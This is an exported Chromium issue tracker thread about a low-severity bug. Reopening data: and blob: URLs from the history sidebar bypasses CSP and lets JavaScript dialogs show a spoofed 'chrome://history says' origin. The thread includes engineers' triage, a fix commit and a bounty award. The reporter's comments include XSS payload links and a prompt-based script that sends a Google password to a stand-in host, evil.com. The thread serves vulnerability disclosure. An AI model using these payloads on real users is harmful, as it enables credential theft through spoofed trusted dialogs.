# Unviersal CSP Bypass/XSS & Privileged chrome:// page XSS via Browser History Sidebar navigation

| Field | Value |
|-------|-------|
| **Issue ID** | [474817168](https://issues.chromium.org/issues/474817168) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>SecurityFeature |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 143.0.7499.170 |
| **Reporter** | is...@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2026-01-11 |
| **Bounty** | $1,000.00 |

## Description

# Steps to reproduce the problem

Data URIs containing JavaScript payloads bypass Content Security Policy when reopened from Chrome's history sidebar, leading to XSS on the original origin. Additionally, this can be escalated to execute JavaScript in the privileged `chrome://history/` context.

# Problem Description

### Affected

Chrome/Chromium, Edge, and Chromium-based browsers.

### Vulnerability Details

**Bug #1: CSP Bypass leading to XSS**

Any page with a strict CSP that allows `data:` in `href` or `img-src` is vulnerable to XSS:

1. User right-clicks data URI link/image → Open in new tab
2. CSP blocks script execution (expected)
3. User closes the data URI tab
4. User opens history sidebar (three dots → History)
5. User clicks data URI entry from sidebar
6. **Script executes in original origin context, CSP bypassed, XSS achieved**

**Bug #2: Privileged Context XSS**

1. Open `chrome://history/` (Ctrl+H)
2. Right-click data URI entry → Open in new tab
3. CSP blocks (expected), close tab
4. Open history sidebar, click same data URI
5. **Script executes under `chrome://history/` context**

### Payloads

<a href="data:text/html,<script>alert('XSS')</script>" target="\_blank">Click</a>

<img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20onload%3D%27alert(1)%27%2F%3E">
### Root Cause

Data URIs reopened from history sidebar lose their CSP association, allowing script execution without policy enforcement while retaining the original origin context.

### Impact

- XSS on any origin allowing data URIs in href/src
- Complete CSP bypass regardless of policy strictness
- Privileged code execution in chrome:// context
- Potential access to sensitive browser APIs

### Note

Even though data URIs are somewhat more restricted from accessing origin context, this bypass demonstrates a serious gap in CSP enforcement through the history sidebar. The ability to execute arbitrary JavaScript in both the original origin and privileged chrome:// contexts undermines the security guarantees that CSP is designed to provide.

### Severity

High/Critical

# Summary

Unviersal CSP Bypass/XSS & Privileged chrome:// page XSS via Browser History Sidebar navigation

# Custom Questions

#### Reporter credit:

Islam Rzayev

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A \

## Attachments

- [chromium-poc.mp4](attachments/chromium-poc.mp4) (video/mp4, 70.1 MB)
- [chromium_csp_bypass_poc.html](attachments/chromium_csp_bypass_poc.html) (text/html, 6.9 KB)
- [test_with_blob.html](attachments/test_with_blob.html) (text/html, 963 B)
- [blob_poc.mp4](attachments/blob_poc.mp4) (video/mp4, 30.4 MB)
- [Tue Jan 13 2026 21:16:55 GMT+0400 (Azerbaijan Standard Time).png](attachments/Tue Jan 13 2026 21_16_55 GMT+0400 (Azerbaijan Standard Time).png) (image/png, 31.8 KB)
- [Tue Jan 13 2026 21:19:47 GMT+0400 (Azerbaijan Standard Time).png](attachments/Tue Jan 13 2026 21_19_47 GMT+0400 (Azerbaijan Standard Time).png) (image/png, 10.4 KB)
- [chrome_poc_prompt.mp4](attachments/chrome_poc_prompt.mp4) (video/mp4, 32.5 MB)

## Timeline

### is...@gmail.com (2026-01-11)

Here is the PoC page I used: https://eog1qu303uu42wf.m.pipedream.net/

Adding the Source code HTML in the attachments also:


### ct...@chromium.org (2026-01-13)

Thank you for attaching the POC file. I can reproduce the alert on Chrome Stable and Chrome Dev on Linux.

With the current POC what is demonstrated is an alert(), however I'm not actually 100% sure if this is just the History navigation decoupling from the page context entirely *but* still remembering the initiator origin which gets tracked with the data: URL. I tried modifying the POC to try to read a secret cookie in the data: URL code:

```
<a class="payload" href="data:text/html,<script>alert('Cookie = ' + document.cookie)</script>" target="_blank">Click to Open</a>

```

(with the cookie set via DevTools)

but that doesn't seem to work.

Are you able to demonstrate actually reading sensitive data, i.e. that the data URL JS is actually running in the context of the victim page?

### is...@gmail.com (2026-01-13)

Hi thanks for your reply,

I observed that data uris have some restrictions - don't know in what level and how - hard to dig into for now.

To achieve same behavior for your point of cookie or data extraction - we can use blob urls for now to prove it.

So instead of data urls, now I will use blob urls with the same steps for demonstration. It is possible to access the cookies with xss and csp bypass

Here is the host i deployed this: https://eork07xgxufi14y.m.pipedream.net/

Adding the PoC html source code and Video.

### pe...@google.com (2026-01-13)

Thank you for providing more feedback. Adding the requester to the CC list.

### ct...@chromium.org (2026-01-13)

Thank you for the updated POC -- I was able to reproduce the load-from-history bypassing CSP (case #1 in your report). This does require some user interaction, and the blob URL approach could be seen as "provenance" for the JS that is ultimately being executed, but it is notable that the initial blob URL load has the CSP applied blocking the JS.

antoniosartori@ could you take a look to help investigate further?

(As a repro note: I was able to repro using the attached poc, but had to load it via an HTTP server for it to work, otherwise the file:// URL breaks it.)

### an...@chromium.org (2026-01-13)

Thanks for your report!

For background: The currently implemented behavior in chrome for `data:` and `blob:` URLs is that chrome stores CSP in history alongside the `FrameNavigationEntry` and restores CSP from there when performing history navigations. This more or less matches the specified behavior (for `blob:` the policies should actually be stored in the blob store and not in history, but we haven't got to implementing that yet). Now note that this works correctly for history navigations in the web platform sense (i.e. when using `history.back()` and `history.forward()` in javascript). Using the History menu in Chrome does not perform a "history navigation" in that sense, but just opens a URL from a list. Chrome does not have access anymore to the right `FrameNavigationEntry` (it could have been deleted, if the tab was closed), so there is no way to recover CSP from history. In the blob URL case, if the tab (of the document which created the blob) was closed, even the blob content is gone and the navigation from the History menu will fail.

Now for `data:` URLs: A `data:` URL document has a unique opaque origin, hence what it can do is very limited. I don't think it's possible to actually perform any XSS with a data: URL in this way.

For `blob:` URLs: A `blob:` URL document has the same origin of the document which created the blob. As such, the `blob:` URL document can access storage and cookies from that origin, and do same-origin fetch requests. So there is a minimal security vulnerability here for the page which created the `blob:` url, since even if that page has a strong CSP and expects the same CSP to be applied to the blob url, there might be cases in which that blob url is opened without CSP. In practice, in order for an attacker to leverage this, they would need to control the content of the blob and trick the user to load the blob URL so that CSP is bypassed (i.e. with the History menu, or copypasting the blob URL in the omnibox) while the blob content is still around (so the creator tab should still be open). I would say that in practice this is very difficult to exploit.

As for `chrome://history` ("privileged context XSS"), I don't really think there is any privileged context XSS, since neither the blob url nor the data url run in the `chrome://` origin and can access anything privileged. Please let me know if I am missing anything here.

Finally, as for what we could concretely do here:

1. the blob: vulnerability would be addressed by properly implementing storing CSP (and more generally the policy container) in the blob store. I don't know if we can prioritize it.
2. I wonder how useful it is to store data: and blob: URL entries in Chrome History (i.e. the history menu). blob: urls will become useless very soon (their content is gone when the creator document is gone) and I'm not sure there are any real use cases for reopening data: urls from the history menu. Maybe we could consider ignoring these entries. (I am not sure whether these entries are synced in history, which would make even less sense I believe.)

### ch...@google.com (2026-01-13)

Setting milestone because of s2 severity.

### ch...@google.com (2026-01-13)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### is...@gmail.com (2026-01-13)

# CSP Bypass via History Sidebar - Impact Rebuttal

## On "difficult to exploit" for blob URLs

The assessment that this is "very difficult to exploit" understates real-world risk. Any page using blob URLs for dynamic content (extremely common for image previews, PDF viewers, file uploads, canvas exports, Web Workers) is vulnerable. A single `<img src="blob:...">` or `URL.createObjectURL()` for user-generated content creates an exploitable entry in history. The attacker doesn't need complex tricks - just get a user to right-click → Open in new tab on any blob content, then revisit via history sidebar. This can be made very phishy.

## On data URI "opaque origin" limitations

While data URIs have opaque origins, dismissing their impact ignores the trust context. When a data URI is reopened via history sidebar from `chrome://history`, the resulting `prompt()` or `alert()` dialog displays `chrome://history says:` - creating a perfect phishing vector. An attacker can social-engineer credential theft:

```
┌─────────────────────────────────────────┐
│ chrome://history says:                  │
│                                         │
│ Please enter your Google account        │
│ password to continue.                   │
│                                         │
│ [_______________________________]       │
│                                         │
│              [OK] [Cancel]              │
└─────────────────────────────────────────┘
```

Users inherently trust `chrome://` dialogs. This bypasses all traditional phishing indicators (URL bar, certificates, domain checks). Even with limited origin access, this UI trust abuse is high-impact.

This attack mirrors traditional `WWW-Authenticate` HTTP authentication prompts - a well-known "intended" logic. The difference here is the attacker gains the trusted `chrome://` context, making it significantly more convincing than standard HTTP auth phishing which users have learned to distrust.

## HTTP/HTTPS origin spoofing

Data URIs reopened from regular HTTP/HTTPS history entries will show that origin in dialogs, enabling targeted phishing against specific domains - `https://accounts.google.com says:` - without any actual compromise of that domain. This allows origin-attributed phishing at scale.

## On CSP bypass severity

CSP exists specifically as a defense-in-depth layer. A bypass that circumvents any CSP policy (including strict nonce-based policies) regardless of how carefully it's configured should be treated as high severity. The vulnerability essentially nullifies CSP for any page allowing blob/data URIs - which includes most modern web applications.

## Future risk

Even if current data URI origin restrictions limit direct impact, this bug class demonstrates a fundamental flaw in how history navigation handles security contexts. Any future relaxation of data URI restrictions, or discovery of additional bypass techniques, would immediately escalate severity. Fixing the root cause now prevents compounding vulnerabilities later.


## PoC For prompt api leaded credential stealing

Attacker creates a script within blob/data uri content and when that is opened after CSP bypass happens, it prompts under that origin (like chrome://history) making it significantly higher problem. Then that password can be stollen to attacker server - still no csp like connect src is applied - so possible.

Here is a data uri embeddable script piece i used for this purpose:

```
const pass = prompt('Your session has expired.\n\nPlease enter your Google account password to continue:');
if (pass) window.location = 'https://evil.com/leaked?password=' + encodeURIComponent(pass);
```
1. Look to the first image which shows the `chrome://` prompt for login - also data uri in url bar is very phishy as the user can't see origin confusion with http(s).
2. After entering the creds, the page leaks the "secret" password to "https://evil.com" - see second image


Please consider all these, thanks.

### ct...@chromium.org (2026-01-13)

> The attacker doesn't need complex tricks - just get a user to right-click → Open in new tab on any blob content, then revisit via history sidebar. This can be made very phishy.

We consider this level of necessary user interaction to merit downgrading severity one level.

### an...@chromium.org (2026-01-13)

On blob URI: The attacker still needs to be able to inject arbitrary content in the blob data though, no?

On data uri: I can't reproduce "chrome://history says". For me the message says "https://<origin-of-the-original-page> says". Can you give clear repro steps for this? Same for your http/https origin spoofing.

### is...@gmail.com (2026-01-13)

`On blob URI: The attacker still needs to be able to inject arbitrary content in the blob data though, no?` - i mean that blob urls are normally constructed by lets say profile image uploads, any file previews and so - which is not like this needs another way to inject into blob. it is indirectly user controlled (initial svg file for profile picture let's say)

For your chrome:// request i added it to my poc host:
https://eork07xgxufi14y.m.pipedream.net/


the html code inside it is: 

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Data URI Test</title>
</head>
<body>
    <h1>Data URI Test (for chrome://history says)</h1>
    <a href="data:text/html,%3Cscript%3Evar%20r%3Dprompt('Session%20expired.%5Cn%5CnEnter%20your%20Google%20password%3A')%3Bif(r)window.location%3D'https%3A%2F%2Fevil.com%2Fleaked%3Fpassword%3D'%2BencodeURIComponent(r)%3Belse%20window.close()%3B%3C%2Fscript%3E" target="_blank">Open Data URI</a>
    <p>Steps: Right-click "Open Data URI" link above → Open link in new tab → auto-closes (prompt suppressed) → go to chrome://history → right-click data URI entry → Open in new tab → close tab manually (CSP blocks) → open history sidebar (three dots → History) → right-click data URI entry → Open in new tab → prompt shows "chrome://history says"</p>
</body>
</html>
```

Also adding a video if you still have issues with reproduction.

### is...@gmail.com (2026-01-13)

For the steps, I am sure the interactions are possible to minimized for user interactions with some html tricks or so.

### an...@chromium.org (2026-01-14)

Thanks for clarifying. I agree that what you report in [comment#13](https://issues.chromium.org/issues/474817168#comment13) is an issue.

Since we discussed a number of things in this bug, let me try to summarize a few things.

1. When opening a local-scheme url that is in history from chrome://history, the local-scheme url can inherit the chrome://history origin. I believe this applies to `about:blank` and `data:` urls (`blob:` urls don't inherit the origin, and I think it's impossible to add a `javascript:` url to history). Now, `about:blank` urls don't allow doing basically anything (they are blank). `data:` urls potentially allow injecting arbitrary code, but: they run in a opaque origin and if opened directly from chrome://history they inherit chrome://history's CSP, which restricts a lot what they can do.
2. However, if the user then opens again the history entry from the three-dot menu, CSP is not inherited. So we are left with a `data:` url with attacker-controlled content running in an opaque origin which inherits from `chrome://history`. I believe that still doesn't allow much (in particular the security model for web APIs should be covered by the same-origin policy, as this is a opaque origin). However, if we use the precursor origin, as we do for generating the title of an alert dialog, we might get into trouble.

(Now this describes XSS on chrome://history, but potentially applies to other webpages, too.)

I believe it is a small but positive improvement to stop displaying the precursor origin for data urls. I don't see any drawbacks of this and opened <https://chromium-review.googlesource.com/c/chromium/src/+/7462512>. I'm not sure who could have opinions around whether this makes sense, maybe clamy@ or dcheng@?

I think it would be also beneficial, if possible, to inherit CSP also when opening history entries from the three-dot menu (although this might not solve all problems, for example it's not clear to me what happens for synced history). creis@ can you help me understand and assess what kind of work would be needed here?

I still have the impression that in practice it is difficult to exploit anything here, so I would consider this low-severity.

### is...@gmail.com (2026-01-15)

deleted

### an...@chromium.org (2026-01-27)

CC avi@ as owner of //components/javascript\_dialogs for thoughts on <https://chromium-review.googlesource.com/c/chromium/src/+/7462512>.

### av...@chromium.org (2026-01-27)

I’m not super up-to-date on how CSPs work, so forgive me. This CL doesn’t strike me as problematic, but as someone looking at the code, it’s not going to be obvious as to why we have that specific data-scheme check. I don't know to what extent we can explain it with a comment, given this is a security issue, but clarifying exactly why it’s needed and how load-bearing that check it will be a good thing to have to ensure it correctly endures.

### an...@chromium.org (2026-01-28)

I added a comment, which is a bit generic but hopefully explains a bit more. I am wondering in general whether it makes sense to attribute javascript dialog from opaque origins to the precursor origin, since opaque origins are mostly used for sandboxing untrusted content. I think the case of data: URLs is particularly bad, because they allow to inline javascript in the URL itself and hence make it possible to create behaviors like the one explained in this bug.

I'll still need to add tests, but I'll send the CL for review afterwards.

### an...@chromium.org (2026-02-16)

Ok, I finally got time to add tests and sent the CL <https://chromium-review.googlesource.com/c/chromium/src/+/7462512> out for review.

As a side note, I do wonder whether it would make sense to extend the behavior proposed by the CL to all opaque origins (and not just data: urls), since at the end of the day the reason why a website would run some code in a subframe with an opaque origin is mostly because it doesn't trust its content, and in particular if that content triggers a js alert the original website would probably not "like" its origin to be displayed there.

Anyway, data: URLs seem the biggest problem here (for example because of the explicit weird behavior that can be triggered on chrome://history, as this bug highlights). So tackling first data: URL seems good.

### dx...@google.com (2026-02-18)

Project: chromium/src  

Branch:  main  

Author:  Antonio Sartori [antoniosartori@chromium.org](mailto:antoniosartori@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7462512>

Don't display precursor origin on javascript alerts with data: url

---


Expand for full commit details
```
     
    This CL tweaks the beheaviour of the util function computing the 
    message to be displayed on javascript alert. If the alerting top-level 
    document has a data: url, we don't display the precursor origin 
    anymore (even if we had one, which only applies in some situations). 
     
    Bug: 474817168 
    Change-Id: I0ee8d60d0c0bcd2ddd1bd158ff0aad344870b595 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7462512 
    Reviewed-by: Avi Drissman <avi@chromium.org> 
    Reviewed-by: Gauthier Ambard <gambard@chromium.org> 
    Commit-Queue: Antonio Sartori <antoniosartori@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1586300}

```

---

Files:

- M `chrome/browser/ui/javascript_dialogs/chrome_app_modal_dialog_manager_delegate.cc`
- M `chrome/browser/ui/javascript_dialogs/javascript_dialog_browsertest.cc`
- M `components/javascript_dialogs/app_modal_dialog_manager.cc`
- M `components/javascript_dialogs/app_modal_dialog_manager.h`
- M `components/javascript_dialogs/app_modal_dialog_manager_unittest.cc`
- M `components/javascript_dialogs/core/dialog_util.cc`
- M `components/javascript_dialogs/core/dialog_util.h`
- M `ios/chrome/browser/overlays/model/public/web_content_area/java_script_dialog_overlay_utils.mm`

---

Hash: [a8e095a03482aaa9554da7835c8ccbb0f146bca4](https://chromiumdash.appspot.com/commit/a8e095a03482aaa9554da7835c8ccbb0f146bca4)  

Date: Wed Feb 18 10:11:40 2026


---

### an...@chromium.org (2026-02-18)

Summarizing:

- for blob: URLs the one reported in [comment#13](https://issues.chromium.org/issues/474817168#comment13) is still a bug/feature request on chrome side, which is tracked in <https://issues.chromium.org/u/1/issues/485466658>. We are not considering that a security issue though.
- for data: URLs, the wrong origin displayed in the javascript alert has been fixed in [comment#21](https://issues.chromium.org/issues/474817168#comment21).

I don't think there are any other open points here.

### is...@gmail.com (2026-03-06)

Hi, will there be a bounty for this?

### sp...@google.com (2026-05-21)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
Security UI Spoofing


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-29)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/474817168)*
